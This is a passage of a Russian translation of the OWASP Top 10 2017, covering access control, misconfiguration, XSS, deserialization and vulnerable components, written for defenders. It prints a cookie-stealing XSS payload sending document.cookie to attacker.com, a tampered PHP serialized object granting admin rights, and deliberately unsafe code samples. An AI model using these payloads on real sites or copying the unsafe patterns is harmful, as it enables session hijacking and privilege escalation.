<td>Зависит от прил. : Сложность эксплуатации 2</td>
<td>Распространенность 2 : Сложность обнаружения 2</td>
<td>Технические 3 : Для бизнеса ?</td>
</tr>
<tr class="even">
<td>Эксплуатация контроля доступа является основным навыком злоумышленников. Инструменты <a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a> и <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a> могут обнаружить отсутствие контроля доступа, но не могут проверить его работоспособность при его наличии. Наличие контроля доступа можно обнаружить вручную, а его отсутствие можно обнаружить автоматически в некоторых фреймворках.</td>
<td>Уязвимости, связанные с контролем доступа, довольно распространены из-за отсутствия автоматического обнаружения и эффективного функционального тестирования разработчиками. Контроль доступа обычно не проверяется автоматическими статическими или динамическими тестами. Тестирование вручную — наилучший способ обнаружения отсутствия или неэффективности контроля доступа, включая методы HTTP (GET, PUT и т. п.), контроллеры, прямые ссылки на объекты и т. д.</td>
<td>Технические последствия: выполнение злоумышленником действий с правами пользователя или администратора; использование пользователем привилегированных функций; создание, просмотр, обновление или удаление любых записей. Последствия для бизнеса зависят от требований к защите приложения и данных.</td>
</tr>
</tbody>
</table>
<h2 id="является-ли-приложение-уязвимым-4">Является ли приложение уязвимым?</h2>
<p>Контроль доступа предполагает наличие политики, определяющей права пользователей. Обход ограничений доступа обычно приводит к несанкционированному разглашению, изменению или уничтожению данных, а также выполнению непредусмотренных полномочиями бизнес-функций. Наиболее распространенные уязвимости контроля доступа включают:</p>
<ul>
<li>обход ограничений доступа путем изменения URL, внутреннего состояния приложения или HTML-страницы, а также с помощью специально разработанных API;</li>
<li>возможность изменения первичного ключа для доступа к записям других пользователей, включая просмотр или редактирование чужой учетной записи;</li>
<li>повышение привилегий. Выполнение операций с правами пользователя, не входя в систему, или с правами администратора, войдя в систему с правами пользователя;</li>
<li>манипуляции с метаданными, например повторное воспроизведение или подмена токенов контроля доступа JWT или куки-файлов, а также изменение скрытых полей для повышения привилегий или некорректное аннулирование JWT;</li>
<li>несанкционированный доступ к API из-за некорректной настройки междоменного использования ресурсов (CORS);</li>
<li>доступ неаутентифицированных пользователей к страницам, требующим аутентификации, или доступ непривилегированных пользователей к привилегированным страницам. Доступ к API с отсутствующим контролем привилегий для POST-, PUT- и DELETE-методов/запросов.</li>
</ul>
<h2 id="как-предотвратить-4">Как предотвратить</h2>
<p>Контроль доступа эффективен только при реализации через проверенный код на стороне сервера или беcсерверный API, где атакующий не может изменять проверки прав доступа или метаданные. Рекомендуется:</p>
<ul>
<li>запрещать доступ по умолчанию, за исключением открытых ресурсов;</li>
<li>реализовать механизмы контроля доступа и использовать их во всех приложениях, а также минимизировать междоменное использование ресурсов;</li>
<li>контролировать доступ к моделям, используя владение записями, а не возможность пользователей создавать, просматривать, обновлять или удалять любые записи;</li>
<li>использовать модели доменов для реализации специальных ограничений, относящихся к приложениям;</li>
<li>отключить вывод списка каталогов веб-сервера, а также обеспечить отсутствие метаданных файлов (например, .git) и файлов резервных копий в корневых веб-каталогах;</li>
<li>регистрировать сбои контроля доступа и уведомлять администраторов при необходимости (например, если сбои повторяются);</li>
<li>ограничивать частоту доступа к API и контроллерам для минимизации ущерба от инструментов автоматизации атак;</li>
<li>аннулировать токены JWT на сервере после выхода из системы.</li>
</ul>
<p>Разработчики и инженеры по контролю качества ПО должны проводить функциональную проверку контроля доступа и тестировать интеграцию.</p>
<h2 id="примеры-сценариев-атак-4">Примеры сценариев атак</h2>
<p><strong>Сценарий №1</strong>: Приложение использует непроверенные данные в SQL-вызове, который обращается к информации об учетной записи:</p>
<pre><code>  pstmt.setString(1, request.getParameter(&quot;acct&quot;));
  ResultSet results = pstmt.executeQuery();</code></pre>
<p>Злоумышленник изменяет в браузере параметр 'acct' для отправки желаемого номера учетной записи. Без должной проверки атакующий может получить доступ к учетной записи любого пользователя.</p>
<p><code>https://example.com/app/accountInfo?acct=notmyacct</code></p>
<p><strong>Сценарий №2</strong>: Злоумышленник задает в браузере целевой URL. Для доступа к странице администрирования требуются права администратора.</p>
<pre><code>  https://example.com/app/getappInfo
  https://example.com/app/admin_getappInfo</code></pre>
<p>Уязвимость существует, если пользователь без аутентификации может получить доступ к этим страницам или если пользователь без прав администратора может получить доступ к странице администрирования.</p>
<h2 id="ссылки-5">Ссылки</h2>
<h3 id="owasp-5">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c7-enforce-access-controls">Проактивная защита OWASP: Контроль доступа</a></li>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">Стандарт подтверждения безопасности приложений OWASP: V4 Контроль доступа</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/README">Руководство OWASP по тестированию: Проверка авторизации</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html">Памятка OWASP: Контроль доступа</a></li>
</ul>
<h3 id="сторонние-5">Сторонние</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22: Некорректные ограничения путей для каталогов (Подмена пути)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/284.html">CWE-284: Некорректное управление доступом (Авторизация)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/285.html">CWE-285: Некорректная авторизация</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/639.html">CWE-639: Обход авторизации, используя значение ключа пользователя</a></li>
<li><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties">PortSwigger: Эксплуатация некорректно настроенного междоменного использования ресурсов</a></li>
</ul>
<h1 id="a62017-некорректная-настройка-параметров-безопасности">A6:2017 Некорректная настройка параметров безопасности</h1>
<table>
<thead>
<tr class="header">
<th>Источники угроз/Векторы атак</th>
<th>Недостатки безопасности</th>
<th>Последствия</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Зависит от прил. : Сложность эксплуатации 3</td>
<td>Распространенность 3 : Сложность обнаружения 3</td>
<td>Технические 2 : Для бизнеса ?</td>
</tr>
<tr class="even">
<td>Злоумышленники часто пытаются эксплуатировать неисправленные уязвимости, настроенные по умолчанию учетные записи, неиспользуемые страницы, незащищенные файлы и каталоги для получения несанкционированного доступа или информации о системе.</td>
<td>Настройка безопасности может быть выполнена некорректно на любом уровне приложения, включая сетевые службы, платформы, веб-службы, сервер, базу данных, фреймворки, код, а также предустановленные виртуальные машины, контейнеры или хранилища. Для поиска уязвимых настроек, настроенных по умолчанию учетных записей, неиспользуемых служб, устаревших параметров и т. п. можно использовать автоматизированные сканеры.</td>
<td>Подобные уязвимости позволяют злоумышленникам получить несанкционированный доступ к системным данным или функциям, а также могут привести к полной компрометации системы. Последствия для бизнеса зависят от требований к защите приложения и данных.</td>
</tr>
</tbody>
</table>
<h2 id="является-ли-приложение-уязвимым-5">Является ли приложение уязвимым?</h2>
<p>Приложение уязвимо, если:</p>
<ul>
<li>любой из компонентов приложения недостаточно защищен или разрешения облачных сервисов некорректно настроены;</li>
<li>включены или присутствуют лишние функции (например, неиспользуемые порты, службы, страницы, учетные записи или привилегии);</li>
<li>учетные записи и пароли, создаваемые по умолчанию, используются без изменений;</li>
<li>обработка ошибок позволяет осуществить трассировку стека или получить слишком подробные сообщения об ошибках;</li>
<li>отключены или некорректно настроены последние обновления безопасности;</li>
<li>не выбраны безопасные значения параметров защиты серверов приложений, фреймворков (например, Struts, Spring, ASP.NET), библиотек и т. п.;</li>
<li>сервер не использует безопасные заголовки или директивы, а также если они некорректно настроены;</li>
<li>ПО устарело или имеет уязвимости (см. <strong>A9:2017-Использование компонентов с известными уязвимостями</strong>).</li>
</ul>
<p>Без организованной и регулярно выполняемой проверки безопасности приложений системы подвержены большему риску.</p>
<h2 id="как-предотвратить-5">Как предотвратить</h2>
<p>Необходимо реализовать процесс безопасной установки, включая:</p>
<ul>
<li>воспроизводимость процессов для быстрого создания безопасных, изолированных сред. Среды для разработки, контроля качества и эксплуатации должны быть настроены одинаково, но иметь разные учетные данные. Процессы должны быть автоматизированы для минимизации затрат на создание новых безопасных сред;</li>
<li>использование платформ только с необходимым набором функций, компонентов, документации и образцов. Удалите или не устанавливайте лишние компоненты или фреймворки;</li>
<li>проверку и актуализацию параметров настройки безопасности в соответствии с выпускаемыми бюллетенями, обновлениями и исправлениями (см. <strong>A9:2017-Использование компонентов с известными уязвимостями</strong>), а также проверку разрешений облачных хранилищ (например, для контейнеров S3);</li>
<li>создание сегментированной архитектуры приложения, обеспечивающей эффективное разграничение компонентов или клиентов с помощью контейнеризации или облачных групп безопасности (списков контроля доступа);</li>
<li>использование безопасных директив для клиентов, например <a href="https://owasp.org/www-project-secure-headers/">Безопасных заголовков</a>;</li>
<li>автоматизацию проверки эффективности используемых конфигураций и настроек во всех средах.</li>
</ul>
<h2 id="примеры-сценариев-атак-5">Примеры сценариев атак</h2>
<p><strong>Сценарий №1</strong>: Сервер приложений поставляется с образцами приложений, которые не удаляются с рабочего сервера. Эти приложения содержат известные уязвимости, позволяющие злоумышленникам скомпрометировать сервер. Если одно из этих приложений является консолью администратора, а стандартные учетные записи не менялись, то атакующий может войти в приложение и перехватить контроль над ним, используя стандартный пароль.</p>
<p><strong>Сценарий №2</strong>: На сервере не отключен вывод списка файлов в каталогах, что позволяет злоумышленнику найти и выгрузить скомпилированные Java-классы, после декомпиляции и обратного анализа которых можно просмотреть исходный код. В результате атакующий может обнаружить уязвимости и получить доступ к приложению.</p>
<p><strong>Сценарий №3</strong>: Сервер приложений настроен на отправку подробных сообщений об ошибках, включая данные о трассировке стека. Это может привести к разглашению важной информации, например о версии компонента, содержащей известные уязвимости.</p>
<p><strong>Сценарий №4</strong>: Поставщик облачных услуг использует стандартные разрешения общего доступа через интернет для других пользователей облака. Это позволяет получить доступ к конфиденциальной информации, доступной в облачном хранилище.</p>
<h2 id="ссылки-6">Ссылки</h2>
<h3 id="owasp-6">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README">Руководство OWASP по тестированию: Управление конфигурацией</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README">Руководство OWASP по тестированию: Коды ошибок</a></li>
<li><a href="https://owasp.org/www-project-secure-headers/">Проект OWASP: Безопасные заголовки</a></li>
</ul>
<p>Для получения дополнительной информации по данной теме см. "Стандарт подтверждения безопасности приложений (ASVS): <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x22-V14-Config.md">V19 Конфигурация</a>".</p>
<h3 id="сторонние-6">Сторонние</h3>
<ul>
<li><a href="https://csrc.nist.gov/publications/detail/sp/800-123/final">Руководство NIST по повышению безопасности серверов</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/2.html">CWE-2: Уязвимости, связанные со средой</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Уязвимости, связанные с конфигурацией</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/388.html">CWE-388: Уязвимости, связанные с обработкой ошибок</a></li>
<li><a href="https://www.cisecurity.org/cis-benchmarks/">Руководства/стандарты CIS по настройке безопасности</a></li>
<li><a href="https://blog.websecurify.com/2017/10/aws-s3-bucket-discovery.html">Обнаружение и перечисление контейнеров Amazon S3</a></li>
</ul>
<h1 id="a72017-межсайтовое-выполнение-сценариев-xss">A7:2017 Межсайтовое выполнение сценариев (XSS)</h1>
<table>
<thead>
<tr class="header">
<th>Источники угроз/Векторы атак</th>
<th>Недостатки безопасности</th>
<th>Последствия</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Зависит от прил. : Сложность эксплуатации 3</td>
<td>Распространённость 3 : Сложность обнаружения 3</td>
<td>Технические 2 : Для бизнеса ?</td>
</tr>
<tr class="even">
<td>Автоматизированные инструменты могут обнаруживать и эксплуатировать все три вида межсайтового выполнения сценариев, более того, фреймворки для их эксплуатации можно найти в открытом доступе.</td>
<td>Межсайтовое выполнение сценариев (XSS) является второй по распространенности уязвимостью из Топ-10 OWASP и обнаруживается в двух третях всех приложений. Автоматизированные инструменты могут обнаруживать XSS автоматически, особенно в случае проработанных технологий, таких как PHP, J2EE / JSP и ASP.NET.</td>
<td>Межсайтовое выполнение сценариев будет иметь последствия средней степени тяжести в случае отраженного XSS или XSS на основе объектной модели документа и серьезные последствия в случае межсайтового выполнения хранимых сценариев с удаленным выполнением кода в браузере пользователя, например в виде кражи учетных данных, перехвата сессий или установки вредоносного ПО.</td>
</tr>
</tbody>
</table>
<h2 id="является-ли-приложение-уязвимым-6">Является ли приложение уязвимым?</h2>
<p>Существует три типа XSS, обычно эксплуатируемых в браузерах:</p>
<ul>
<li><strong>Отраженное межсайтовое выполнение сценариев (Reflected XSS)</strong>: Приложение или API включает непроверенные и непреобразованные данные в состав HTML. Успешная атака может привести к выполнению произвольного HTML- и JavaScript-кода в браузере жертвы. Обычно злоумышленнику необходимо убедить пользователя перейти по ссылке, ведущей на вредоносную страницу, например используя атаку типа "водопой" или рекламу.</li>
<li><strong>Межсайтовое выполнение хранимых сценариев (Stored XSS)</strong>: Приложение или API сохраняет необработанные входные данные, с которыми затем взаимодействуют пользователи или администраторы. Межсайтовое выполнение хранимых сценариев обычно считается очень опасной уязвимостью.</li>
<li><strong>Межсайтовое выполнение сценариев на основе объектной модели документа (DOM XSS)</strong>: JavaScript-фреймворки, одностраничные приложения и API, динамически добавляющие вредоносные данные на страницы, подвержены XSS на основе DOM. В идеале приложение не должно отправлять вредоносные данные небезопасным JavaScript API.</li>
</ul>
<p>Обычно XSS используется для перехвата сессий, кражи учетных записей, обхода МФА, замены или подмены DOM-узлов (напр., троянские панели входа в систему), а также атак на браузеры, например для загрузки вредоносного ПО, регистрации нажатий и других атак на стороне клиента.</p>
<h2 id="как-предотвратить-6">Как предотвратить</h2>
<p>Для предотвращения XSS необходимо отделять непроверенные данные от активного контента браузера. Этого можно достичь следующими способами:</p>
<ul>
<li>Использовать фреймворки с автоматическим преобразованием данных, как в последних версиях Ruby on Rails и React JS. Необходимо также проанализировать ограничения XSS-защиты каждого фреймворка и обеспечить соответствующую обработку этих исключений.</li>
<li>Преобразовывать недоверенные данные из HTTP-запросов, основываясь на контексте, в HTML-коде (теле, атрибутах, JavaScript, CSS или URL) для предотвращения отраженного XSS и межсайтового выполнения хранимых сценариев. <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">"Памятка OWASP: Предотвращение XSS"</a> содержит подробные инструкции по преобразованию данных.</li>
<li>Применять контекстное кодирование при изменении документа в браузере пользователя для предотвращения XSS на основе DOM. Если это невозможно, то применять контекстное кодирование к API браузера (см. <a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">"Памятку OWASP: Предотвращение XSS на основе DOM"</a>).</li>
<li>Использовать <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">политику защиты содержимого (CSP)</a> для предотвращения XSS. Эта мера эффективна, если отсутствуют уязвимости, позволяющие внедрить код через локальные файлы (напр., используя подмену путей или уязвимые библиотеки из разрешенных сетей доставки контента).</li>
</ul>
<h2 id="примеры-сценариев-атак-6">Примеры сценариев атак</h2>
<p><strong>Сценарий №1</strong>: Приложение использует непроверенные данные при создании HTML-сниппета без их подтверждения или преобразования:</p>
<pre><code>(String) page += &quot;&lt;input name=&#39;creditcard&#39; type=&#39;TEXT&#39; value=&#39;&quot; + request.getParameter(&quot;CC&quot;) + &quot;&#39;&gt;&quot;;</code></pre>
<p>Злоумышленник меняет параметр 'CC' в браузере на:</p>
<pre><code>&#39;&gt;&lt;script&gt;document.location=&#39;https://attacker.com/cgi-bin/cookie.cgi?foo=&#39;+document.cookie&lt;/script&gt;&#39;</code></pre>
<p>Идентификатор сессии жертвы отправляется на сайт злоумышленника, позволяя атакующему перехватить текущую сессию пользователя.</p>
<p><strong>Примечание</strong>: злоумышленник может использовать XSS для обхода защиты от межсайтовой подмены запросов (CSRF), используемой в приложении.</p>
<h2 id="ссылки-7">Ссылки</h2>
<h3 id="owasp-7">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data">Проактивная защита OWASP: Кодирование данных</a></li>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data">Проактивная защита OWASP: Проверка данных</a></li>
<li><a href="https://owasp.org/www-project-application-security-verification-standard/">Стандарт подтверждения безопасности приложений OWASP: V5</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting">Руководство OWASP по тестированию: Отраженное межсайтовое выполнение сценариев</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting">Руководство OWASP по тестированию: Межсайтовое выполнение хранимых сценариев</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting">Руководство OWASP по тестированию: XSS на основе объектной модели документа</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">Памятка OWASP: Предотвращение XSS</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">Памятка OWASP: Предотвращение XSS на основе DOM</a></li>
<li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">Памятка OWASP: Обход фильтра XSS</a></li>
<li><a href="https://owasp.org/www-project-java-encoder/">Проект кодировщика Java от OWASP</a></li>
</ul>
<h3 id="сторонние-7">Сторонние</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Некорректная нейтрализация входных данных от пользователей</a></li>
<li><a href="https://portswigger.net/kb/issues/00200308_client-side-template-injection">PortSwigger: Внедрение в пользовательские шаблоны</a></li>
</ul>
<h1 id="a82017-небезопасная-десериализация">A8:2017 Небезопасная десериализация</h1>
<table>
<thead>
<tr class="header">
<th>Источники угроз/Векторы атак</th>
<th>Недостатки безопасности</th>
<th>Последствия</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Зависит от прил. : Сложность эксплуатации 1</td>
<td>Распространенность 2 : Сложность обнаружения 2</td>
<td>Технические 3 : Для бизнеса ?</td>
</tr>
<tr class="even">
<td>Эксплуатировать десериализацию сложно, поскольку готовые эксплойты редко можно использовать без их изменения или доработки.</td>
<td>Данная уязвимость включена в Топ-10 по результатам <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">отраслевых исследований</a> , а не по количественным показателям. Некоторые инструменты могут обнаруживать ошибки десериализации, но для их подтверждения обычно требуется участие специалиста. Ожидается, что по мере разработки новых инструментов обнаружения и устранения ошибок десериализации данных об их распространенности станет больше.</td>
<td>Последствия ошибок десериализации нельзя недооценивать. Подобные ошибки могут привести к удаленному выполнению кода, одной из самых опасных уязвимостей. Последствия для бизнеса зависят от требований к защите приложения и данных.</td>
</tr>
</tbody>
</table>
<h2 id="является-ли-приложение-уязвимым-7">Является ли приложение уязвимым?</h2>
<p>Приложения и API уязвимы, если осуществляют десериализацию вредоносных или модифицированных объектов, предоставляемых злоумышленником.</p>
<p>Это позволяет осуществить два основных типа атак:</p>
<ul>
<li>атаки, связанные со структурой объектов и данных, когда злоумышленник изменяет логику приложения или удаленно выполняет произвольный код при наличии доступных приложению классов, поведение которых может меняться во время или после десериализации;</li>
<li>атаки с подменой данных, например связанные с управлением доступом, когда используются существующие структуры данных, но изменяется содержимое.</li>
</ul>
<p>Сериализация может использоваться в приложениях для:</p>
<ul>
<li>удаленного и межпроцессного взаимодействия (RPC/IPC);</li>
<li>проводных протоколов, веб-служб, брокеров сообщений;</li>
<li>кэширования или сохранения данных;</li>
<li>баз данных, серверов кэширования, файловых систем;</li>
<li>куки-файлов HTTP, параметров HTML-форм, токенов аутентификации API.</li>
</ul>
<h2 id="как-предотвратить-7">Как предотвратить</h2>
<p>Единственным безопасным решением будет игнорирование сериализованных объектов от недоверенных источников или использование среды сериализации, допускающей только примитивные типы данных.</p>
<p>Если это невозможно, рекомендуется следующее:</p>
<ul>
<li>Проверка целостности сериализованных объектов, например с помощью цифровых подписей, для предотвращения создания вредоносных объектов или подмены данных.</li>
<li>Ввод строгих ограничений типов при десериализации перед созданием объекта, поскольку ожидаемым является поддающийся определению набор классов. Существуют методы обхода подобной защиты, поэтому полагаться исключительно на нее не рекомендуется.</li>
<li>Изоляция и запуск кода, осуществляющего десериализацию, в среде с минимальными привилегиями, если это возможно.</li>
<li>Журналирование исключений и ошибок десериализации, например непредусмотренных типов входных данных или исключений при десериализации.</li>
<li>Ограничение или контроль входящих и исходящих сетевых подключений контейнеров или серверов, осуществляющих десериализацию.</li>
<li>Отслеживание десериализации с предупреждением о фактах продолжительной десериализации.</li>
</ul>
<h2 id="примеры-сценариев-атак-7">Примеры сценариев атак</h2>
<p><strong>Сценарий №1</strong>. React-приложение вызывает набор микрослужб Spring Boot. Будучи функциональными программистами, разработчики попытались обеспечить неизменяемость своего кода. Используемое ими решение заключается в сериализации состояния пользователя и передаче его с каждым запросом. Злоумышленник, заметивший подпись Java-объекта "rO0", может использовать Java Serial Killer для удаленного выполнения кода на сервере приложения.</p>
<p><strong>Сценарий №2</strong>. На PHP-форуме используется сериализация PHP-объектов для хранения "суперкуки", содержащих идентификатор, роль, хеш пароля и другие данные пользователя:</p>
<pre><code>a:4:{i:0;i:132;i:1;s:7:&quot;Mallory&quot;;i:2;s:4:&quot;user&quot;;i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;}</code></pre>
<p>Злоумышленник изменяет сериализованный объект, наделяя себя привилегиями администратора:</p>
<pre><code>a:4:{i:0;i:1;i:1;s:5:&quot;Alice&quot;;i:2;s:5:&quot;admin&quot;;i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;}</code></pre>
<h2 id="ссылки-8">Ссылки</h2>
<h3 id="owasp-8">OWASP</h3>
<ul>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">Памятка OWASP: Десериализация</a></li>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c5-validate-inputs">Проактивная защита OWASP: Обязательная проверка всех входных данных</a></li>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">Стандарт подтверждения безопасности приложений OWASP</a></li>
<li><a href="https://speakerdeck.com/pwntester/surviving-the-java-deserialization-apocalypse">OWASP AppSecEU 2016: Как пережить апокалипсис десериализации Java</a></li>
<li><a href="https://speakerdeck.com/pwntester/friday-the-13th-json-attacks">OWASP AppSecUSA 2017: Пятница, 13-е — Джейсон под ударом</a></li>
</ul>
<h3 id="сторонние-8">Сторонние</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502: Десериализация недоверенных данных</a></li>
<li><a href="https://github.com/mbechler/marshalsec">Безопасность десериализации Java</a></li>
<li><a href="https://frohoff.github.io/appseccali-marshalling-pickles/">OWASP AppSec Cali 2015: Консервируем объекты</a></li>
</ul>
<h1 id="a92017-использование-компонентов-с-известными-уязвимостями">A9:2017 Использование компонентов с известными уязвимостями</h1>
<table>
<thead>
<tr class="header">
<th>Источники угроз/Векторы атак</th>
<th>Недостатки безопасности</th>
<th>Последствия</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Зависит от прил. : Сложность эксплуатации 2</td>
<td>Распространенность 3 : Сложность обнаружения 2</td>
<td>Технические 2 : Для бизнеса ?</td>
</tr>
<tr class="even">
<td>Несмотря на простоту поиска уже готовых эксплойтов для большинства известных уязвимостей, некоторые из них требуют создания специальных средств для их эксплуатации. </td>
<td>Данная уязвимость является очень распространенной. Шаблоны для разработчиков, содержащие большое количество компонентов, могут привести к непониманию того, какие компоненты реально используются в приложении или API. Некоторые сканеры, такие как retire.js, могут помочь с обнаружением уязвимостей, но определение сложности их эксплуатации потребует дополнительных усилий.</td>
<td>Несмотря на то, что не все уязвимости приводят к серьезным последствиям, причиной некоторых масштабных взломов стали именно компоненты, содержащие известные уязвимости. В зависимости от защищаемых активов подобная угроза может оказаться на вершине вашего списка.</td>
</tr>
</tbody>
</table>
<h2 id="является-ли-приложение-уязвимым-8">Является ли приложение уязвимым?</h2>
<p>Приложение уязвимо, если:</p>
<ul>
<li>вы не знаете версии всех используемых (на стороне клиента и на стороне сервера) компонентов. Сюда относятся сами компоненты и встроенные зависимости;</li>
<li>ПО содержит уязвимости, не поддерживается или устарело. Сюда относятся ОС, веб-серверы, серверы приложений, СУБД, приложения, API, а также все компоненты, среды исполнения и библиотеки;</li>
<li>поиск уязвимостей выполняется нерегулярно, а также отсутствует подписка на бюллетени по безопасности используемых компонентов;</li>
<li>своевременно не устанавливаются исправления или обновления для используемых платформ, фреймворков и зависимостей. Обычно такое происходит, когда наличие обновлений проверяется раз в месяц или квартал, в результате чего организации неделями или месяцами не устраняют исправленные уязвимости;</li>
<li>разработчики ПО не тестируют совместимость обновленных или исправленных библиотек;</li>
<li>не обеспечивается безопасность компонентов (см. <a href="0xa6-security-misconfiguration.md">A6:2017-Некорректные параметры безопасности</a>).</li>
</ul>
<h2 id="как-предотвратить-8">Как предотвратить</h2>
<p>Необходимо реализовать процесс управления обновлениями:</p>
<ul>
<li>удалите неиспользуемые зависимости, а также лишние функции, компоненты, файлы и сведения из документации;</li>
<li>регулярно проверяйте актуальность версий клиентских и серверных компонентов (например, фреймворков и библиотек), а также их зависимостей, используя такие инструменты, как <a href="http://www.mojohaus.org/versions-maven-plugin/">versions</a>, <a href="https://owasp.org/www-project-dependency-check/">DependencyCheck</a>, <a href="https://github.com/retirejs/retire.js/">retire.js</a>. Следите за новостями об уязвимостях на соответствующих ресурсах, таких как <a href="https://cve.mitre.org/">CVE</a> и <a href="https://nvd.nist.gov/">NVD</a>. Используйте инструменты анализа состава ПО для автоматизации процесса. Подпишитесь на рассылки об уязвимостях, относящихся к используемым вами компонентам;</li>
<li>загружайте компоненты из официальных источников по безопасным ссылкам. Отдавайте предпочтение подписанным пакетам для снижения риска установки измененного или вредоносного компонента;</li>
<li>следите за библиотеками и компонентами, которые не поддерживаются или не получают обновлений безопасности. Если обновление невозможно, попробуйте использовать <a href="https://owasp.org/www-community/Virtual_Patching_Best_Practices#What_is_a_Virtual_Patch.3F">виртуальные патчи</a> для обнаружения или предотвращения эксплуатации известных уязвимостей.</li>
</ul>
<p>Каждая организация должна обеспечить отслеживание, приоритизацию и применение обновлений или изменений в конфигурации на протяжении всего жизненного цикла приложения или линейки приложений.</p>
<h2 id="примеры-сценариев-атак-8">Примеры сценариев атак</h2>
<p><strong>Сценарий №1</strong>: Компоненты обычно запускаются с привилегиями приложения, поэтому уязвимость в любом из компонентов может привести к серьезным последствиям. Уязвимость может появиться случайно (например, из-за ошибки в коде) или преднамеренно (например, бэкдор). Вот несколько примеров эксплуатации уязвимостей, обнаруженных в компонентах:</p>
<ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638">CVE-2017-5638</a>: уязвимость в Struts 2, позволяющая удаленно выполнить произвольный код на сервере, стала причиной нескольких серьезных взломов;</li>
<li>уязвимости в <a href="https://en.wikipedia.org/wiki/Internet_of_things">интернете вещей (IoT)</a> зачастую сложно или невозможно устранить, а это может привести к серьезным последствиям (например, в случае биомедицинских приборов).</li>
</ul>
<p>Существуют автоматизированные инструменты, позволяющие злоумышленникам находить уязвимые или некорректно настроенные системы. Например, поисковик <a href="https://www.shodan.io/">Shodan для IoT</a> позволяет обнаружить устройства, в которых до сих пор не устранена уязвимость <a href="https://en.wikipedia.org/wiki/Heartbleed">Heartbleed</a>, которая была исправлена в апреле 2014 года.</p>
<h2 id="ссылки-9">Ссылки</h2>
<h3 id="owasp-9">OWASP</h3>
<ul>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x10-V1-Architecture.md">Стандарт подтверждения безопасности приложений OWASP: V1 Архитектура, разработка и моделирование угроз</a></li>
<li><a href="https://owasp.org/www-project-dependency-check/">Проверки зависимостей OWASP (для библиотек Java и .NET)</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture">Руководство OWASP по тестированию: Установление взаимосвязей в архитектуре приложения (OTG-INFO-010)</a></li>
<li><a href="https://owasp.org/www-community/Virtual_Patching_Best_Practices">Рекомендации OWASP по использованию виртуальных патчей</a></li>
</ul>
<h3 id="сторонние-9">Сторонние</h3>
<ul>
<li><a href="https://cdn2.hubspot.net/hub/203759/file-1100864196-pdf/docs/Contrast_-_Insecure_Libraries_2014.pdf">Унылая реальность небезопасных библиотек</a></li>
<li><a href="https://www.cvedetails.com/version-search.php">Поиск уязвимостей (CVE) MITRE</a></li>
<li><a href="https://nvd.nist.gov/">Национальная база данных уязвимостей (NVD)</a></li>
<li><a href="https://github.com/retirejs/retire.js/">Retire.js для обнаружения известных уязвимых библиотек JavaScript</a></li>
<li><a href="https://nodesecurity.io/advisories">Бюллетени по безопасности библиотек Node</a></li>
<li><a href="https://rubysec.com/">Инструменты и база данных бюллетеней по безопасности библиотек Ruby</a></li>
</ul>
<h1 id="a102017-недостатки-журналирования-и-мониторинга">A10:2017 Недостатки журналирования и мониторинга</h1>
